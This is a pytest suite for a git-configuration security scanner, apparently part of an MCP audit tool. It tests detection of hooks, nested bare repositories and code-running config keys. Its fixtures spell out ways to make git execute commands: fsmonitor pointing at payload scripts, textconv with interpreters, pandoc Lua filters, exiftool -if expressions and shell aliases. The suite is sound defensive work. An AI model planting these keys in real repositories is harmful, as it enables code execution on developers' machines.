        _hook(git_dir / "hooks", "post-index-change.sample")
        highs = _highs(scan_repository(tmp_path))
        assert [(f.id, f.finding_path) for f in highs] == [("TRUST-007", str(hook))]

    def test_hooks_path_replaces_git_hooks(self, tmp_path: Path) -> None:
        git_dir = _git_dir(tmp_path, "[core]\n\thooksPath = .githooks\n")
        _hook(git_dir / "hooks", "post-index-change")  # inert: hooksPath wins
        custom = _hook(tmp_path / ".githooks", "post-index-change")
        findings = scan_repository(tmp_path)
        assert [f.finding_path for f in _highs(findings)] == [str(custom)]
        assert not any(f.title.startswith("Git hooks installed") for f in findings)


class TestLegitimateRepositories:
    """Common real-world layouts must produce no HIGH (and mostly INFO only)."""

    def test_husky_v9(self, tmp_path: Path) -> None:
        _git_dir(tmp_path, "[core]\n\thooksPath = .husky/_\n")
        stubs = tmp_path / ".husky" / "_"
        for name in (
            "pre-commit",
            "pre-merge-commit",
            "prepare-commit-msg",
            "commit-msg",
            "post-commit",
            "applypatch-msg",
            "pre-applypatch",
            "post-applypatch",
            "pre-rebase",
            "post-rewrite",
            "post-checkout",
            "post-merge",
            "pre-push",
            "pre-auto-gc",
            "h",
        ):
            _hook(stubs, name)
        (stubs / ".gitignore").write_text("*\n")
        _hook(tmp_path / ".husky", "pre-commit")
        findings = scan_repository(tmp_path)
        assert _highs(findings) == []
        assert {f.severity for f in findings} == {Severity.INFO}

    def test_husky_v4_and_pre_commit_hooks(self, tmp_path: Path) -> None:
        git_dir = _git_dir(tmp_path)
        for name in ("pre-commit", "commit-msg", "pre-push", "post-checkout"):
            _hook(git_dir / "hooks", name)
        findings = scan_repository(tmp_path)
        assert _highs(findings) == []
        assert _pairs(findings) == {("TRUST-007", Severity.INFO)}

    def test_git_lfs_install_local(self, tmp_path: Path) -> None:
        git_dir = _git_dir(
            tmp_path,
            '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n'
            "\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n"
            "\trequired = true\n",
        )
        for name in ("pre-push", "post-checkout", "post-commit", "post-merge"):
            _hook(git_dir / "hooks", name)
        findings = scan_repository(tmp_path)
        assert _highs(findings) == []
        assert {f.severity for f in findings} == {Severity.INFO}

    def test_actions_checkout_v6_plus_layout_is_silent(self, tmp_path: Path) -> None:
        name = f"git-credentials-{_CHECKOUT_UUID}.config"
        _git_dir(
            tmp_path,
            "\tfilemode = true\n\tlogallrefupdates = true\n"
            '[remote "origin"]\n\turl = https://github.com/acme/widget\n'
            "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
            "[gc]\n\tauto = 0\n"
            '[includeIf "gitdir:/home/runner/work/widget/widget/.git"]\n'
            f"\tpath = /home/runner/work/_temp/{name}\n"
            '[includeIf "gitdir:/github/workspace/.git"]\n'
            f"\tpath = /github/runner_temp/{name}\n"
            '[http "https://github.com/"]\n\textraheader = AUTHORIZATION: basic ***\n',
        )
        assert scan_repository(tmp_path) == []

    def test_typical_developer_config_is_silent(self, tmp_path: Path) -> None:
        _git_dir(
            tmp_path,
            '[remote "origin"]\n\turl = git@github.com:acme/widget.git\n'
            '[branch "main"]\n\tremote = origin\n\tmerge = refs/heads/main\n'
            "[core]\n\tfsmonitor = true\n\tuntrackedCache = true\n"
            "[user]\n\temail = dev@example.com\n[pull]\n\trebase = true\n",
        )
        assert scan_repository(tmp_path) == []


# ── TRUST-007: nested bare repositories ──────────────────────────────────────


class TestBareRepositories:
    def test_is_bare_repository(self, tmp_path: Path) -> None:
        assert is_bare_repository(_bare(tmp_path / "a.git"))
        sha = tmp_path / "sha"
        _bare(sha)
        (sha / "HEAD").write_text("a" * 40 + "\n")
        assert is_bare_repository(sha)

    @pytest.mark.parametrize("broken", ["no-refs", "no-objects", "bad-head", "no-head"])
    def test_not_bare_when_incomplete(self, tmp_path: Path, broken: str) -> None:
        repo = _bare(tmp_path / "x")
        if broken == "no-refs":
            (repo / "refs" / "heads").rmdir()
            (repo / "refs").rmdir()
        elif broken == "no-objects":
            (repo / "objects").rmdir()
        elif broken == "bad-head":
            (repo / "HEAD").write_text("hello\n")
        else:
            (repo / "HEAD").unlink()
        assert not is_bare_repository(repo)

    def test_nested_bare_repo_is_high(self, tmp_path: Path) -> None:
        _git_dir(tmp_path)
        nested = _bare(tmp_path / "vendor" / "payload")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert [(f.id, f.finding_path) for f in _highs(findings)] == [
            ("TRUST-007", str(nested))
        ]

    def test_nested_bare_repo_exec_key_fires_both(self, tmp_path: Path) -> None:
        nested = _bare(tmp_path / "x", "[core]\n\tfsmonitor = ./p\n\tworktree = ..\n")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert {(f.id, f.finding_path) for f in _highs(findings)} == {
            ("TRUST-007", str(nested)),
            ("TRUST-006", str(nested / "config")),
        }

    def test_fixture_bare_repo_without_exec_keys_is_info(self, tmp_path: Path) -> None:
        _bare(tmp_path / "tests" / "fixtures" / "sample.git")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert _pairs(findings) == {("TRUST-007", Severity.INFO)}

    def test_fixture_bare_repo_with_exec_key_stays_high(self, tmp_path: Path) -> None:
        _bare(tmp_path / "tests" / "evil.git", "[diff]\n\texternal = ./d\n")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert ("TRUST-007", Severity.HIGH) in _pairs(findings)

    def test_bare_repo_plus_worktrees_layout_is_not_embedded(
        self, tmp_path: Path
    ) -> None:
        # ~/proj/.bare (bare) + ~/proj/.git -> "gitdir: ./.bare": the repo's own
        # git dir, not an embedded one.  Its config is still checked, once.
        _bare(tmp_path / ".bare", "[core]\n\tbare = true\n\tfsmonitor = ./x\n")
        (tmp_path / ".git").write_text("gitdir: ./.bare\n")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert [(f.id, f.severity) for f in findings] == [("TRUST-006", Severity.HIGH)]

    def test_scan_root_itself_bare_is_not_nested(self, tmp_path: Path) -> None:
        _bare(tmp_path)
        surfaces = discover_project_git_surfaces(tmp_path)
        assert surfaces == [GitSurface("bare-repo", tmp_path, nested=False)]
        assert scan_git_surfaces(surfaces, scan_root=tmp_path) == []


# ── The scan --project walk ──────────────────────────────────────────────────


class TestDiscoverProjectGitSurfaces:
    def test_finds_dot_git_dirs_files_and_bare_repos(self, tmp_path: Path) -> None:
        _git_dir(tmp_path)
        _git_dir(tmp_path / "vendor" / "lib")
        (tmp_path / "sub").mkdir()
        (tmp_path / "sub" / ".git").write_text("gitdir: ../.git/modules/sub\n")
        _bare(tmp_path / "data" / "mirror.git")
        found = {(s.kind, s.path) for s in discover_project_git_surfaces(tmp_path)}
        assert found == {
            ("dot-git", tmp_path / ".git"),
            ("dot-git", tmp_path / "vendor" / "lib" / ".git"),
            ("dot-git", tmp_path / "sub" / ".git"),
            ("bare-repo", tmp_path / "data" / "mirror.git"),
        }

    def test_never_descends_into_git_dirs_or_bare_repos(self, tmp_path: Path) -> None:
        git_dir = _git_dir(tmp_path)
        _bare(git_dir / "modules" / "sub")  # a submodule git dir, inside .git
        bare = _bare(tmp_path / "b.git")
        _git_dir(bare / "objects" / "deep")  # would only be seen by walking objects/
        found = discover_project_git_surfaces(tmp_path)
        assert {s.path for s in found} == {tmp_path / ".git", bare}

    def test_skip_dirs_and_depth_cap(self, tmp_path: Path) -> None:
        _bare(tmp_path / "node_modules" / "pkg" / "x.git")
        deep = tmp_path
        for i in range(_WALK_MAX_DEPTH + 1):
            deep = deep / f"d{i}"
        _bare(deep)
        assert discover_project_git_surfaces(tmp_path) == []

    def test_symlinked_directory_is_reported_not_followed(self, tmp_path: Path) -> None:
        target = tmp_path / "outside"
        _bare(target / "x.git")
        root = tmp_path / "root"
        root.mkdir()
        try:
            (root / "link").symlink_to(target, target_is_directory=True)
        except OSError:
            pytest.skip("symlinks unavailable")
        skipped: list[Finding] = []
        assert discover_project_git_surfaces(root, skip_findings=skipped) == []
        assert [f.id for f in skipped] == ["TRUST-005"]


# ── Default scan: the repository git would use from the CWD ──────────────────


@pytest.fixture()
def real_cwd_check(monkeypatch: pytest.MonkeyPatch) -> None:
    """Undo conftest's isolation so the default-scan path really runs."""
    monkeypatch.setattr(git_exec, "scan_cwd_repository", _REAL_SCAN_CWD)


class TestScanCwdRepository:
    def test_repo_root_and_subdirectory(self, tmp_path: Path) -> None:
        root = tmp_path.resolve()  # the cwd check resolves, like git does
        _git_dir(root, "[core]\n\tfsmonitor = ./x\n")
        (root / "src" / "pkg").mkdir(parents=True)
        for start in (root, root / "src" / "pkg"):
            findings = _REAL_SCAN_CWD(start)
            assert [f.finding_path for f in _highs(findings)] == [
                str(root / ".git" / "config")
            ]

    def test_outside_any_repository_reports_nothing_here(self, tmp_path: Path) -> None:
        root = tmp_path.resolve()
        findings = _REAL_SCAN_CWD(root)
        assert not any(str(root) in (f.finding_path or "") for f in findings)

    def test_inside_an_embedded_bare_repo(self, tmp_path: Path) -> None:
        _git_dir(tmp_path)
        nested = _bare(tmp_path / "payload", "[core]\n\tfsmonitor = ./p\n")
        findings = _REAL_SCAN_CWD(nested)
        assert {(f.id, f.severity) for f in _highs(findings)} == {
            ("TRUST-006", Severity.HIGH),
            ("TRUST-007", Severity.HIGH),
        }

    def test_default_run_scan_includes_cwd_repo(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        real_cwd_check: None,
    ) -> None:
        from mcp_audit.scanner import run_scan

        _git_dir(tmp_path, "[core]\n\tfsmonitor = ./x\n")
        monkeypatch.chdir(tmp_path)
        monkeypatch.setattr("mcp_audit.discovery._get_client_specs", lambda: [])
        result = run_scan(skip_rug_pull=True)
        assert ("TRUST-006", Severity.HIGH) in _pairs(result.findings)

    def test_explicit_path_scan_skips_cwd_repo(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        real_cwd_check: None,
    ) -> None:
        from mcp_audit.scanner import run_scan

        _git_dir(tmp_path, "[core]\n\tfsmonitor = ./x\n")
        config = tmp_path / "mcp.json"
        config.write_text(json.dumps({"mcpServers": {}}))
        monkeypatch.chdir(tmp_path)
        result = run_scan(extra_paths=[config], skip_rug_pull=True)
        assert not any(f.id in git_exec.GIT_FINDING_IDS for f in result.findings)

    def test_check_reports_git_findings_without_mcp_configs(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
        real_cwd_check: None,
    ) -> None:
        from mcp_audit.cli import app

        _git_dir(tmp_path, "[core]\n\tfsmonitor = ./x\n")
        monkeypatch.chdir(tmp_path)
        monkeypatch.setattr("mcp_audit.discovery._get_client_specs", lambda: [])
        r = CliRunner().invoke(app, ["check", "--no-lock"])
        assert r.exit_code == 1
        assert "No MCP config files found" not in r.output
        assert "core.fsmonitor" in r.output


# ── scan --project wiring ────────────────────────────────────────────────────


class TestProjectScanWiring:
    def test_project_scan_emits_and_dedupes(self, tmp_path: Path) -> None:
        from rich.console import Console

        from mcp_audit.cli.scan import _apply_project_scan

        tmp_path = tmp_path.resolve()  # `scan --project` resolves its argument
        _git_dir(tmp_path, "[core]\n\tfsmonitor = ./x\n")
        _bare(tmp_path / "vendor" / "p")
        result = ScanResult()
        # The default scan's cwd check already found the root config hit.
        result.findings.extend(_REAL_SCAN_CWD(tmp_path))
        result = _apply_project_scan(result, tmp_path, None, None, Console(quiet=True))
        keys = [
            (f.id, f.finding_path)
            for f in result.findings
            if f.id in git_exec.GIT_FINDING_IDS
        ]
        assert sorted(keys) == sorted(
            [
                ("TRUST-006", str(tmp_path / ".git" / "config")),
                ("TRUST-007", str(tmp_path / "vendor" / "p")),
            ]
        )

    def test_demo_configs_produce_no_git_findings(self, real_cwd_check: None) -> None:
        from mcp_audit.scanner import run_scan

        demo = Path(__file__).parent.parent / "demo" / "configs"
        result = run_scan(extra_paths=[demo], skip_rug_pull=True)
        assert not any(f.id in git_exec.GIT_FINDING_IDS for f in result.findings)


# ── Review of PR #181: regressions, one class per finding ────────────────────


class TestNbstripoutInstall:
    """Review item 1: `nbstripout --install` writes four keys, smudge = cat."""

    def test_full_install_with_system_python_is_info_only(self, tmp_path: Path) -> None:
        text = (
            '[filter "nbstripout"]\n'
            '\tclean = \\"/usr/bin/python3\\" -m nbstripout\n'
            "\tsmudge = cat\n"
            "\trequired = true\n"
            '[diff "ipynb"]\n'
            '\ttextconv = \\"/usr/bin/python3\\" -m nbstripout -t\n'
        )
        hits = _hits(tmp_path, text)
        assert {h.severity for h in hits} == {Severity.INFO}
        assert len(hits) == 3


class TestTextconvConverters:
    """Review item 2: common converters are INFO; interpreters stay HIGH."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "exiftool",
            "docx2txt",
            "pdftotext -layout",
            "pandoc --to=markdown",
            "odt2txt",
            "strings",
            "hexdump -C",
            "xxd",
            "cat",
            "sops decrypt",
            "gpg -d --quiet",
            "gpg2 --decrypt",
            "age -d",
            "unzip -c -a",
            "exiftool -a -u -g1 -s3 -x File:*",
            "pandoc -f markdown+smart -t plain --wrap=none",
            "pandoc -tplain -s",
            "sops -d --input-type yaml",
            "gpg --no-tty --batch -d -q",
            "age -d -i ~/.config/age/key.txt",
            "hexdump -v -C",
            "xxd -c 32",
            "strings -n 8",
        ],
    )
    def test_converter_is_info(self, tmp_path: Path, cmd: str) -> None:
        hits = _hits(tmp_path, f'[diff "x"]\n\ttextconv = {cmd}\n')
        assert [h.severity for h in hits] == [Severity.INFO]

    @pytest.mark.parametrize(
        "cmd",
        [
            "bun",  # deliberate: bun runs any .js file .gitattributes routes to it
            "node",
            "python3 conv.py",
            "pandoc --lua-filter=filter.lua",
            "pandoc -Lfilter.lua",
            "pandoc --filter pandoc-evil",
            "exiftool -config x.config",
            "exiftool -if 1",
            "sops exec-env",
            "ansible-vault view",
            "ansible-vault view --vault-password-file .vault_pass",
            "gpg --homedir .gnupg -d",
            "pdftotext ./scripts/evil",
        ],
    )
    def test_code_loading_forms_stay_high(self, tmp_path: Path, cmd: str) -> None:
        hits = _hits(tmp_path, f'[diff "x"]\n\ttextconv = {cmd}\n')
        assert [h.severity for h in hits] == [Severity.HIGH]


class TestConverterAllowlist:
    """Round 2: a converter is INFO only when every argument is on its allowlist."""

    @pytest.mark.parametrize(
        ("cmd", "repo_files"),
        [
            # A Lua reader or writer is a script pandoc runs (os.execute).
            ("pandoc -f reader.lua -t plain", ("reader.lua",)),
            ("pandoc --from=reader.lua -t plain", ("reader.lua",)),
            ("pandoc -freader.lua -t plain", ("reader.lua",)),
            ("pandoc -r reader.lua", ()),
            ("pandoc -t writer.lua", ()),
            ("pandoc --to=./w.lua", ()),
            ("pandoc -w writer.lua", ()),
            # Attached -o writes the output wherever it names.
            ("pandoc -t plain -o.git/hooks/post-index-change", ()),
            ("pandoc -t plain --output=x", ()),
            ("pandoc -Lf.lua -t plain", ()),
            ("pandoc --template=./t.tex -t plain", ()),
            ("pandoc --lua-f=f.lua", ()),  # an abbreviated long option
            # ExifTool reads option names case-insensitively, with a number.
            ("exiftool -if2 system(1)", ()),
            ("exiftool -IF system(1)", ()),
            ("exiftool -If 1", ()),
            ("exiftool -CONFIG cfg", ()),
            ("exiftool -p $Comment", ()),
            ("exiftool -Comment=x", ()),
            ("gpg --homedir=.gnupg -d", ()),
            ("gpg --home .gnupg -d", ()),
            ("age -d -i key.txt", ("key.txt",)),
            ("age -d -i ./keys/k", ()),
            ("sops exec-file x y", ()),
            ("cat ./notes.txt", ()),
            ("cat notes.txt", ("notes.txt",)),
            ("strings @args", ()),
            ("unzip -c -a -d out", ()),
        ],
    )
    def test_bypass_is_high(
        self, tmp_path: Path, cmd: str, repo_files: tuple[str, ...]
    ) -> None:
        config = _cfg(tmp_path, f'[diff "x"]\n\ttextconv = {cmd}\n')
        for name in repo_files:
            target = tmp_path / "repo" / name
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text("x\n")
        hits = check_git_config(config)
        assert [h.severity for h in hits] == [Severity.HIGH]
        assert "not one of the arguments" in hits[0].note

    def test_ansible_vault_reads_repo_ansible_cfg(self, tmp_path: Path) -> None:
        # `view` reads vault_password_file from ./ansible.cfg (the repo root),
        # and that setting can name a script, so ansible-vault is never known.
        config = _cfg(tmp_path, '[diff "v"]\n\ttextconv = ansible-vault view\n')
        (tmp_path / "repo" / "ansible.cfg").write_text(
            "[defaults]\nvault_password_file = ./pw.sh\n"
        )
        assert [h.severity for h in check_git_config(config)] == [Severity.HIGH]

    def test_value_naming_a_repo_entry_is_high(self, tmp_path: Path) -> None:
        # A built-in format name that is also a file at the repo root.
        config = _cfg(tmp_path, '[diff "x"]\n\ttextconv = pandoc -t plain\n')
        (tmp_path / "repo" / "plain").write_text("x\n")
        assert [h.severity for h in check_git_config(config)] == [Severity.HIGH]

    def test_cat_smudge_with_an_argument_is_high(self, tmp_path: Path) -> None:
        hits = _hits(tmp_path, '[filter "nb"]\n\tsmudge = cat ./x\n')
        assert _sev(hits, "filter.nb.smudge") == Severity.HIGH

    @pytest.mark.parametrize(
        ("text", "key", "severity"),
        [
            # git-lfs merge-driver --program runs a command.
            (
                '[merge "lfs"]\n\tdriver = git-lfs merge-driver --program "id"'
                " --ancestor %O --current %A --other %B\n",
                "merge.lfs.driver",
                Severity.MEDIUM,
            ),
            # emacsclient runs its alternate editor when no server is up.
            ("[core]\n\teditor = emacsclient -ash\n", "core.editor", Severity.MEDIUM),
            (
                "[core]\n\teditor = emacsclient --alternate-editor=sh\n",
                "core.editor",
                Severity.MEDIUM,
            ),
            ("[core]\n\teditor = emacs --load=x.el\n", "core.editor", Severity.MEDIUM),
            # bat and delta pipe the text they page into --pager.
            ("[core]\n\tpager = bat --pager=sh\n", "core.pager", Severity.LOW),
            ("[core]\n\tpager = delta --pager=sh\n", "core.pager", Severity.LOW),
            # less -o writes everything it pages to a file.
            ("[core]\n\tpager = less -o.git/hooks/x\n", "core.pager", Severity.LOW),
            ("[core]\n\tpager = less -k keys\n", "core.pager", Severity.LOW),
            (
                '[filter "lfs"]\n\tsmudge = git-lfs smudge evil\n',
                "filter.lfs.smudge",
                Severity.HIGH,
            ),
            (
                "[diff]\n\texternal = difft --override=x\n",
                "diff.external",
                Severity.HIGH,
            ),
        ],
    )
    def test_other_known_tools_are_allowlisted_too(
        self, tmp_path: Path, text: str, key: str, severity: Severity
    ) -> None:
        assert _sev(_hits(tmp_path, text), key) == severity

    @pytest.mark.parametrize(
        ("text", "key"),
        [
            (
                '[merge "lfs"]\n\tdriver = git-lfs merge-driver --ancestor %O'
                " --current %A --other %B --marker-size %L --output %A\n",
                "merge.lfs.driver",
            ),
            (
                '[merge "jupyternotebook"]\n\tdriver = git-nbmergedriver merge'
                " %O %A %B %L %P\n",
                "merge.jupyternotebook.driver",
            ),
            (
                '[filter "annex"]\n\tsmudge = git-annex smudge -- %f\n',
                "filter.annex.smudge",
            ),
            (
                '[filter "annex"]\n\tclean = git-annex smudge --clean -- %f\n',
                "filter.annex.clean",
            ),
            (
                '[filter "lfs"]\n\tsmudge = git-lfs smudge --skip -- %f\n',
                "filter.lfs.smudge",
            ),
            (
                '[diff "gc"]\n\ttextconv = \\"git-crypt\\" diff --key-name=work\n',
                "diff.gc.textconv",
            ),
            ("[core]\n\tpager = delta --side-by-side --paging=never\n", "core.pager"),
            ("[core]\n\tpager = less -+F -RX\n", "core.pager"),
            ("[core]\n\tpager = bat --style=plain --paging=always\n", "core.pager"),
            ("[core]\n\teditor = subl -n -w\n", "core.editor"),
            ("[core]\n\teditor = vim -f\n", "core.editor"),
            ("[core]\n\teditor = emacsclient -c -a emacs\n", "core.editor"),
        ],
    )
    def test_documented_forms_stay_info(
        self, tmp_path: Path, text: str, key: str
    ) -> None:
        assert _sev(_hits(tmp_path, text), key) == Severity.INFO


class TestToolsReadingTheirOwnConfig:
    """Round 3: git-lfs and delta run programs named in their own config section."""

    _LFS_FILTERS = (
        '[filter "lfs"]\n\tclean = git-lfs clean -- %f\n'
        "\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n"
        "\trequired = true\n"
    )

    def test_lfs_extension_is_high_and_lfs_filters_lose_known(
        self, tmp_path: Path
    ) -> None:
        # The reviewer's lfsext fixture: git-lfs 3.4.1 ran the extension on
        # `git add` and on `git status --porcelain=2 --branch`.
        text = self._LFS_FILTERS + (
            '[lfs "extension.foo"]\n\tclean = /opt/ext.sh %f\n'
            "\tsmudge = /opt/ext.sh %f\n\tpriority = 0\n"
        )
        hits = _hits(tmp_path, text)
        assert {h.key: h.severity for h in hits} == {
            "filter.lfs.clean": Severity.HIGH,
            "filter.lfs.smudge": Severity.HIGH,
            "filter.lfs.process": Severity.HIGH,
            "lfs.extension.foo.clean": Severity.HIGH,
            "lfs.extension.foo.smudge": Severity.HIGH,
        }
        assert "lfs.extension.foo.clean" in _sev_note(hits, "filter.lfs.clean")

    def test_lfs_extension_alone_is_high(self, tmp_path: Path) -> None:
        # The LFS filter may come from the user's own git config.
        hits = _hits(tmp_path, '[lfs "extension.x"]\n\tclean = ./x %f\n')
        assert _sev(hits, "lfs.extension.x.clean") == Severity.HIGH

    def test_lfs_custom_transfer_is_medium(self, tmp_path: Path) -> None:
        text = self._LFS_FILTERS + (
            '[lfs "customtransfer.mine"]\n\tpath = lfs-folderstore\n'
            "\targs = --verbose\n[lfs]\n\tstandalonetransferagent = mine\n"
        )
        hits = _hits(tmp_path, text)
        assert _sev(hits, "lfs.customtransfer.mine.path") == Severity.MEDIUM
        assert _sev(hits, "lfs.customtransfer.mine.args") == Severity.MEDIUM
        assert _sev(hits, "filter.lfs.smudge") == Severity.HIGH
        assert _sev(hits, "lfs.standalonetransferagent") is None

    def test_other_lfs_keys_leave_git_lfs_known(self, tmp_path: Path) -> None:
        text = self._LFS_FILTERS + (
            "[lfs]\n\trepositoryformatversion = 0\n\turl = https://lfs.example.com\n"
            '[lfs "extension.foo"]\n\tpriority = 0\n'
        )
        hits = _hits(tmp_path, text)
        assert {h.severity for h in hits} == {Severity.INFO}

    @pytest.mark.parametrize(
        "delta_section",
        ["[delta]\n\tpager = sh\n", '[delta "f"]\n\tpager = ./p\n'],
    )
    def test_delta_pager_makes_delta_unknown(
        self, tmp_path: Path, delta_section: str
    ) -> None:
        hits = _hits(tmp_path, "[core]\n\tpager = delta\n" + delta_section)
        assert _sev(hits, "core.pager") == Severity.LOW
        assert {h.severity for h in hits} == {Severity.LOW}

    def test_delta_pager_alone_is_low(self, tmp_path: Path) -> None:
        # Applies when the user's own config pages through delta.
        hits = _hits(tmp_path, "[delta]\n\tpager = sh\n")
        assert _sev(hits, "delta.pager") == Severity.LOW

    def test_delta_pager_with_known_pager_keeps_delta_known(
        self, tmp_path: Path
    ) -> None:
        text = "[core]\n\tpager = delta\n[delta]\n\tpager = less -R\n"
        hits = _hits(tmp_path, text)
        assert {h.severity for h in hits} == {Severity.INFO}

    def test_delta_no_gitconfig_ignores_delta_section(self, tmp_path: Path) -> None:
        text = "[core]\n\tpager = delta --no-gitconfig\n[delta]\n\tpager = sh\n"
        hits = _hits(tmp_path, text)
        assert _sev(hits, "core.pager") == Severity.INFO
        assert _sev(hits, "delta.pager") == Severity.LOW


class TestDependencyCacheBareRepos:
    """Review item 3: package managers keep bare clones inside projects."""

    @pytest.mark.parametrize(
        "rel",
        [
            ".build/repositories/swift-argument-parser-1a2b3c4d",
            "vendor/bundle/ruby/3.3.0/cache/bundler/git/somegem-0123456789abcdef",
            ".cargo/git/db/serde-0123456789abcdef",
            "gopath/pkg/mod/cache/vcs/0123456789abcdef",
        ],
    )
    def test_cache_mirror_is_info(self, tmp_path: Path, rel: str) -> None:
        _bare(tmp_path / rel)
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert _pairs(findings) == {("TRUST-007", Severity.INFO)}

    def test_cache_mirror_with_command_key_is_high(self, tmp_path: Path) -> None:
        _bare(tmp_path / ".build/repositories/x-1", "[core]\n\tfsmonitor = ./p\n")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert ("TRUST-007", Severity.HIGH) in _pairs(findings)

    @pytest.mark.parametrize(
        "rel", [".build/repositories/x-1", "tests/fixtures/sample.git"]
    )
    def test_benign_location_with_index_hook_is_high(
        self, tmp_path: Path, rel: str
    ) -> None:
        bare = _bare(tmp_path / rel)
        _hook(bare / "hooks", "post-index-change")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        nested = [f for f in findings if f.server == "(bare repository)"]
        assert [f.severity for f in nested] == [Severity.HIGH]


class TestSameIncludeTwice:
    """Review item 4: git re-applies a file included twice; so must we."""

    def test_reinclude_after_override_is_high(self, tmp_path: Path) -> None:
        config = _cfg(
            tmp_path,
            "[include]\n\tpath = x.inc\n[core]\n\tfsmonitor = false\n"
            "[include]\n\tpath = x.inc\n",
        )
        (config.parent / "x.inc").write_text("[core]\n\tfsmonitor = ./payload.sh\n")
        hits = check_git_config(config)
        assert [(h.key, h.severity) for h in hits] == [
            ("core.fsmonitor", Severity.HIGH)
        ]

    def test_sibling_includes_of_one_file_are_each_read(self, tmp_path: Path) -> None:
        config = _cfg(tmp_path, "[include]\n\tpath = a\n\tpath = a\n")
        (config.parent / "a").write_text("[diff]\n\texternal = ./d\n")
        assert _sev(check_git_config(config), "diff.external") == Severity.HIGH


class TestDecoyDotGit:
    """Review item 5: git skips an invalid .git directory and keeps walking up."""

    def test_cwd_check_walks_past_an_empty_dot_git_dir(self, tmp_path: Path) -> None:
        root = tmp_path.resolve()
        _git_dir(root, "[core]\n\tfsmonitor = ./payload.sh\n")
        (root / "app" / ".git").mkdir(parents=True)  # decoy: not a git dir
        findings = _REAL_SCAN_CWD(root / "app")
        assert [f.finding_path for f in _highs(findings)] == [
            str(root / ".git" / "config")
        ]

    def test_malformed_dot_git_file_stops_the_search(self, tmp_path: Path) -> None:
        root = tmp_path.resolve()
        _git_dir(root, "[core]\n\tfsmonitor = ./payload.sh\n")
        (root / "app").mkdir()
        (root / "app" / ".git").write_text("not a gitdir pointer\n")
        assert _REAL_SCAN_CWD(root / "app") == []  # git itself errors out here

    def test_gitfile_to_a_non_repository_is_ignored(self, tmp_path: Path) -> None:
        (tmp_path / "target").mkdir()
        (tmp_path / ".git").write_text("gitdir: ./target\n")
        assert scan_repository(tmp_path) == []

    def test_project_walk_ignores_the_decoy(self, tmp_path: Path) -> None:
        _git_dir(tmp_path)
        decoy = tmp_path / "app" / ".git"
        decoy.mkdir(parents=True)
        (decoy / "config").write_text("[core]\n\tfsmonitor = ./never-read\n")
        findings = scan_git_surfaces(
            discover_project_git_surfaces(tmp_path), scan_root=tmp_path
        )
        assert not any("never-read" in f.evidence for f in findings)

    def test_running_inside_dot_git_is_not_an_embedded_bare_repo(
        self, tmp_path: Path
    ) -> None:
        root = tmp_path.resolve()
        git_dir = _git_dir(root, "[core]\n\tfsmonitor = ./x\n")
        findings = _REAL_SCAN_CWD(git_dir / "hooks")
        assert not any(f.server == "(bare repository)" for f in findings)
        assert ("TRUST-006", Severity.HIGH) in _pairs(findings)


class TestKnownToolDefeats:
    """Review item 6: ways around the known-tool INFO downgrade."""

    def test_git_lfs_subcommand_form_is_not_known(self, tmp_path: Path) -> None:
        # Without git-lfs installed, `git lfs` runs alias.lfs from this config.
        text = (
            '[filter "lfs"]\n\tsmudge = git lfs smudge -- %f\n'
            '[alias]\n\tlfs = "!f() { touch MARK; cat; }; f"\n'
        )
        assert _sev(_hits(tmp_path, text), "filter.lfs.smudge") == Severity.HIGH

    @pytest.mark.parametrize(
        "name",
        [
            "nbstripout.py",
            "nbstripout.pyc",
            "nbstripout.cpython-312-x86_64-linux-gnu.so",
            "nbstripout.pyd",
            "nbstripout",
        ],
    )
    def test_any_repo_root_module_shadow_is_high(
        self, tmp_path: Path, name: str
    ) -> None:
        config = _cfg(tmp_path, '[filter "nb"]\n\tclean = python3 -m nbstripout\n')
        target = tmp_path / "repo" / name
        if name == "nbstripout":
            target.mkdir()
        else:
            target.write_bytes(b"\x00")
        assert _sev(check_git_config(config), "filter.nb.clean") == Severity.HIGH

    def _venv(self, repo: Path, *, cfg: bool) -> Path:
        bindir = repo / ".venv" / "bin"
        bindir.mkdir(parents=True)
        py = bindir / "python"
        try:
            py.symlink_to(Path(os.__file__).resolve())  # any file outside the tree
        except OSError:
            pytest.skip("symlinks unavailable")
        if cfg:
            (repo / ".venv" / "pyvenv.cfg").write_text("home = /usr/bin\n")
        return py

    def test_venv_interpreter_symlink_is_judged_where_it_sits(
        self, tmp_path: Path
    ) -> None:
        repo = tmp_path / "repo"
        repo.mkdir()
        self._venv(repo, cfg=True)
        text = '[filter "nb"]\n\tclean = \\".venv/bin/python\\" -m nbstripout\n'
        assert _sev(_hits(tmp_path, text), "filter.nb.clean") == Severity.MEDIUM

    def test_symlinked_interpreter_without_pyvenv_cfg_is_high(
        self, tmp_path: Path
    ) -> None:
        repo = tmp_path / "repo"
        repo.mkdir()
        self._venv(repo, cfg=False)
        text = '[filter "nb"]\n\tclean = \\".venv/bin/python\\" -m nbstripout\n'
        assert _sev(_hits(tmp_path, text), "filter.nb.clean") == Severity.HIGH

    def test_conda_environment_is_medium(self, tmp_path: Path) -> None:
        repo = tmp_path / "repo"
        (repo / "env" / "conda-meta").mkdir(parents=True)
        py = repo / "env" / "bin" / "python"
        text = f'[filter "nb"]\n\tclean = "{py.as_posix()}" -m nbstripout\n'
        assert _sev(_hits(tmp_path, text), "filter.nb.clean") == Severity.MEDIUM


